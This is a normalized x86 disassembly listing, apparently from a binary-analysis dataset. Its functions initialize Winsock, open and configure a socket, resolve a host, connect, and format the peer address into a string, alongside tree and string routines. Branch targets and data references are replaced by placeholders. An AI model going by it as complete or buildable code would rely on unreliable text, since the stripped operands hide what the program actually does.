mov eax sub_43cf2e
call sub_425dad
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] esi
push [ ebp + 0x8 ]
call sub_413bc5
push edi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x48 ]
push r--data
inc esi
push eax
mov [ ebp - 0x10 ] esi
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] esi
call sub_40f9cf
add esp 0xc
mov ebx [ ebp + 0xc ]
push eax
push 0x20
push esi
mov [ ebp - 0x4 ] 0x2
call sub_4149f1
xor ebx ebx
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
cmp [ edi + 0x14 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
mov ebx [ ebp + 0x8 ]
push edi
call sub_413bfb
mov [ eax ] 0x1466
sub_4137b2
push 0x34
mov eax sub_43ecb1
call sub_425dad
push [ ebp + 0xc ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x8 ]
push eax
call sub_40fac5
add esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
mov ecx [ ebp - 0x40 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
push 0xfffffff6
push 0xfffffff7
jmp r-xdata
push [ ebp + 0xc ]
call sub_40f2d4
movzx eax [ eax + 0x1c ]
push eax
call sub_40f2d4
mov ecx eax
call sub_4138d7
pop ecx
pop ecx
test eax eax
jge r-xdata
pop esi
mov esi eax
jmp r-xdata
call sub_41bfbb
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x40 ]
push eax
call sub_40fb35
mov eax esi
call sub_425e4c
retn
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x40 ]
lea edi [ ebp - 0x20 ]
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
call sub_40f543
test al al
jne r-xdata
sub_413849
push ebp
mov ebp esp
sub esp 0x19c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x198 ]
push eax
push 0x101
call WSAStartup
test eax eax
je r-xdata
push r--data
call getprotobyname
test eax eax
jne r-xdata
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ eax + 0x8 ]
push eax
push 0x1
push 0x2
call socket
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0xfffffff6
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4234de
leave
retn
push 0x4
lea eax [ ebp - 0x19c ]
push eax
push 0x4
push 0xffff
push esi
mov [ ebp - 0x19c ] 0x1
call setsockopt
push 0xfffffff7
jmp r-xdata
mov eax esi
pop esi
call WSACleanup
jmp r-xdata
sub_4138d7
push 0xbc
mov eax sub_43ec7f
call sub_425e16
mov eax [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x28 ] eax
call sub_413849
mov [ ebp - 0x24 ] eax
test eax eax
jl r-xdata
call sub_425e60
retn
cmp [ ebx + 0x18 ] 0x10
lea esi [ ebx + 0x4 ]
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x2
pop eax
push [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ax
call htons
mov [ ebp - 0x1e ] ax
cmp [ edi + 0xa ] 0x4
jne r-xdata
call WSACleanup
push 0xfffffff6
pop eax
push eax
call gethostbyname
mov edi eax
test edi edi
jne r-xdata
mov eax [ edi + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0xc8 ]
push eax
call sub_408d83
and [ ebp - 0x4 ] 0x0
xor eax eax
lea edi [ ebp - 0x18 ]
stosd [ edi ]
stosd [ edi ]
push 0x10
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x24 ]
call connect
test eax eax
jne r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
push r--data
push ecx
push [ ebp + 0x8 ]
push ecx
push r--data
push ecx
push [ ebp - 0x1c ]
call inet_ntoa
push eax
push ecx
push r--data
push ecx
push esi
push ecx
lea eax [ ebp - 0xc8 ]
push r--data
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_413ad5
pop ecx
push eax
call sub_40feed
pop ecx
pop ecx
lea ecx [ ebp - 0x44 ]
lea eax [ ebp - 0xc8 ]
call sub_408e2c
mov ebx [ ebp - 0x28 ]
push eax
push 0x20
push 0x0
mov [ ebp - 0x4 ] 0x2
call sub_4149f1
push 0x0
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_40415f
push [ ebp - 0x24 ]
call closesocket
push 0xfffffff7
pop esi
jmp r-xdata
mov esi [ esi ]
push r--data
push ecx
push [ ebp + 0x8 ]
push ecx
push r--data
push ecx
push [ ebp - 0x1c ]
call inet_ntoa
push eax
push ecx
push r--data
push ecx
push esi
push ecx
lea eax [ ebp - 0xc8 ]
push r--data
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_40feed
add esp 0xc
push eax
call sub_413ad5
pop ecx
push eax
call sub_40feed
pop ecx
pop ecx
lea ecx [ ebp - 0x44 ]
lea eax [ ebp - 0xc8 ]
call sub_408e2c
mov ebx [ ebp - 0x28 ]
push eax
push 0x20
push 0x0
mov [ ebp - 0x4 ] 0x1
call sub_4149f1
push 0x0
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_40415f
mov esi [ ebp - 0x24 ]
mov esi [ esi ]
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc8 ]
call sub_408986
mov eax esi
jmp r-xdata
sub_413ad5
push 0x24
mov eax sub_43ea35
call sub_425de0
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_4094e6
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x1c ]
call sub_406595
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40a7d3
pop ecx
lea ecx [ ebp - 0x1c ]
mov esi eax
call sub_4061b7
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x30 ] bl
mov cl [ ecx + 0x30 ]
mov ebx [ esi ]
mov [ ebp - 0x20 ] cl
movzx ecx [ ebp + 0xc ]
push ecx
push [ ebp - 0x20 ]
add eax edi
push eax
push edx
push [ ebp - 0x30 ]
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x30 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_409545
mov eax edi
call sub_425e4c
retn 0x8
push ebx
push [ ebp - 0x18 ]
call sub_408b69
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_413b69
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_406490
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_413bc5
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_413ea5
mov eax esi
call sub_425e4c
retn 0x4
sub_413bfb
push 0x38
mov eax sub_43b05c
call sub_425dad
mov eax [ ebx + 0x18 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
call sub_40f543
test al al
jne r-xdata
mov [ ebp - 0x14 ] esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x44 ]
call sub_403de3
xor esi esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] esi
push [ ebp - 0x18 ]
lea eax [ ebp - 0x44 ]
push [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
call sub_413cb7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov [ ebp - 0x1c ] ecx
push 0x1
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x18 ] eax
call sub_40415f
mov ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
lea esi [ ebp - 0x1c ]
call sub_40f2d4
add eax 0x1c
call sub_425e4c
retn 0x4
sub_413cb7
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x1c ] eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
add ecx 0xc
mov eax edi
call sub_405664
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
add eax 0xc
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
push ebx
lea ebx [ ebp - 0x14 ]
call sub_413ec6
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov ecx [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_40f86a
mov eax [ eax + 0x4 ]
add eax 0xc
mov ecx edi
call sub_405664
test al al
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
push 0x0
jmp r-xdata
push [ ebp + 0xc ]
push 0x1
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_41bfbb
lea edi [ ebp - 0x10 ]
mov esi eax
call sub_40f543
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2d ] 0x0
push edi
mov esi ebx
je r-xdata
mov esi ebx
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2d ] 0x0
push [ ebp + 0xc ]
mov esi ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
jmp r-xdata
push 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push 0x1
jmp r-xdata
push [ ebp + 0x8 ]
call sub_414008
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_413e49
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x18 ]
mov esi ecx
mov edi [ esi + 0x18 ]
add eax 0x4
push edi
push [ eax ]
call sub_413f8a
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ esi + 0x18 ]
mov ecx [ eax + 0x4 ]
xor bl bl
cmp [ ecx + 0x2d ] bl
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x2d ] bl
je r-xdata
mov [ eax ] eax
mov esi [ esi + 0x18 ]
mov [ esi + 0x8 ] esi
mov ecx edx
mov [ eax ] ecx
mov esi [ esi + 0x18 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x2d ] bl
je r-xdata
mov ecx eax
mov [ esi + 0x8 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413ec6
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp [ edi + 0x2d ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_405664
mov [ ebp - 0x8 ] al
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
je r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ edi + 0xc ]
call sub_405664
test al al
je r-xdata
mov ecx [ esi + 0x18 ]
mov ecx [ ecx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_40f86a
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x1
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_414008
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
pop edi
mov eax ebx
pop esi
leave
retn 0x8
sub_413f8a
push 0xc
mov eax sub_43a8c4
call sub_425de0
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x2d ] 0x0
mov eax [ edi + 0x18 ]
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_425e4c
retn 0x8
movzx ecx [ esi + 0x2c ]
push ecx
push eax
push [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
push eax
call sub_414181
mov ebx eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push [ esi ]
mov ecx edi
call sub_413f8a
push ebx
mov [ ebx ] eax
push [ esi + 0x8 ]
mov ecx edi
call sub_413f8a
mov [ ebx + 0x8 ] eax
mov [ ebp - 0x14 ] ebx
sub_414008
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov edi ecx
cmp [ esi + 0x1c ] 0x7fffffe
jb r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x10 ]
push 0x0
push eax
push edi
push eax
call sub_414181
inc [ esi + 0x1c ]
mov ebx eax
mov eax [ esi + 0x18 ]
cmp edi eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ eax + 0x4 ] ebx
mov eax [ esi + 0x18 ]
mov [ eax ] ebx
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebx
mov edi ebx
lea eax [ ebx + 0x4 ]
jmp r-xdata
mov [ eax ] ebx
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
call sub_425e4c
retn 0xc
mov edx [ edx ]
cmp [ edx + 0x2c ] 0x0
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x2c ] 0x0
je r-xdata
cmp edi [ ecx ]
jne r-xdata
mov [ ecx + 0x2c ] 0x1
mov [ edx + 0x2c ] 0x1
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x2c ] 0x0
mov eax [ eax ]
mov edi [ eax + 0x4 ]
jmp r-xdata
cmp edi [ ecx + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_41c218
push esi
mov edi ecx
call sub_40f8cb
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_40f8cb
jmp r-xdata
push esi
mov edi ecx
call sub_41c218
sub_414157
push 0x30
call sub_4246c6
xor edx edx
pop ecx
cmp eax edx
je r-xdata
lea ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
mov [ eax ] edx
lea ecx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ eax + 0x2c ] 0x1
mov [ eax + 0x2d ] dl
retn
mov [ ecx ] edx
sub_414181
push 0xc
mov eax sub_43a8a9
call sub_425de0
mov ebx ecx
push 0x30
call sub_4246c6
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
call sub_425e4c
retn 0x10
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x10 ]
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
mov [ esi + 0x8 ] eax
call sub_403de3
mov eax [ ebx + 0x1c ]
mov [ edi + 0x1c ] eax
mov al [ ebp + 0x14 ]
mov [ esi + 0x2c ] al
mov [ esi + 0x2d ] 0x0
sub_414210
push 0x24
mov eax sub_43afba
call sub_425dad
mov edi [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
mov [ edi + 0x4 ] 0x10
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_403dae
mov [ ebp - 0x4 ] 0x1
mov [ edi + 0x24 ] 0x0
test ebx ebx
je r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push eax
lea ecx [ ebp - 0x30 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
push ecx
mov ecx ebx
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x44 ]
mov [ ebp - 0xd ] 0x1
test al al
jne r-xdata
mov eax edi
call sub_425e4c
retn 0x4
mov [ edi + 0x24 ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x2c ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_40400a
xor eax eax
inc eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0x14 ] al
je r-xdata
sub_4142ec
push 0x40
mov eax sub_43c0af
call sub_425dad
mov esi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ esi + 0x24 ] bl
jne r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push ebx
add esi 0x8
push esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x1
call sub_41ec78
mov esi eax
jmp r-xdata
call sub_425e4c
retn
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
mov eax esi
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_4143b7
push 0x24
mov eax sub_43afba
call sub_425dad
mov edi [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
mov [ edi + 0x4 ] 0x8
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_403dae
mov [ ebp - 0x4 ] 0x1
mov [ edi + 0x24 ] 0x0
test ebx ebx
je r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push eax
lea ecx [ ebp - 0x30 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
push ecx
mov ecx ebx
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x44 ]
mov [ ebp - 0xd ] 0x1
test al al
jne r-xdata
mov eax edi
call sub_425e4c
retn 0x4
mov [ edi + 0x24 ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x2c ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_40400a
xor eax eax
inc eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0x14 ] al
je r-xdata
sub_414493
push 0x40
mov eax sub_43c0af
call sub_425dad
mov esi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ esi + 0x24 ] bl
jne r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push ebx
add esi 0x8
push esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x1
call sub_41ec78
mov esi eax
jmp r-xdata
call sub_425e4c
retn
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
mov eax esi
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_414542
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_404490
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_4044ac
test al al
je r-xdata
call sub_422b4b
mov eax esi
retn 0x4
mov dl [ esp + 0x4 ]
push edi
xor ecx ecx
mov eax esi
call sub_404452
push edi
mov ecx esi
call sub_404490
sub_414585
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov edi ecx
xor ebx ebx
cmp [ edi + 0x30 ] ebx
je r-xdata
lea esi [ edi + 0x70 ]
push r--data
mov ecx esi
call sub_40409c
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_41491f
pop ecx
pop ecx
push 0xffffffff
push ebx
lea esi [ edi + 0x70 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_40400a
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
jmp r-xdata
push 0xffffffff
push ebx
lea eax [ edi + 0x38 ]
call sub_404233
call sub_414884
call sub_425e4c
retn
sub_4145f0
push 0x5c
mov eax sub_43c069
call sub_425dad
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ esi + 0x14 ] ebx
jne r-xdata
push ebx
push r--data
push esi
call sub_403eca
push ebx
push r--data
push esi
mov [ ebp - 0x14 ] eax
call sub_403eca
cmp [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
push r--data
mov ecx edi
call sub_40409c
or esi 0xffffffff
push esi
push ebx
push eax
lea ecx [ edi + 0x54 ]
call sub_40400a
push esi
push ebx
push eax
lea ecx [ edi + 0x1c ]
call sub_40400a
push esi
push ebx
push eax
lea ecx [ edi + 0x38 ]
call sub_40400a
push esi
push ebx
push eax
lea ecx [ edi + 0x8c ]
call sub_40400a
push esi
push ebx
push eax
lea ecx [ edi + 0x70 ]
call sub_40400a
jmp r-xdata
push [ ebp - 0x14 ]
push ebx
push esi
lea esi [ ebp - 0x30 ]
call sub_40ed02
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_418ff0
pop ecx
pop ecx
or esi 0xffffffff
push esi
push ebx
push eax
lea ecx [ edi + 0x1c ]
mov [ ebp - 0x4 ] 0x4
call sub_40400a
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] esi
call sub_40415f
mov eax [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] esi
je r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_425e4c
retn 0x4
push esi
inc eax
push eax
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_40ed02
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_40400a
push ebx
push 0x1
mov ecx [ ebp - 0x10 ]
sub ecx eax
dec ecx
push ecx
inc eax
push eax
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_40ed02
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_40400a
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
mov ecx esi
call sub_40415f
mov eax [ ebp - 0x10 ]
push 0xffffffff
inc eax
push eax
push [ ebp + 0x8 ]
lea esi [ ebp - 0x30 ]
call sub_40ed02
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_418ff0
pop ecx
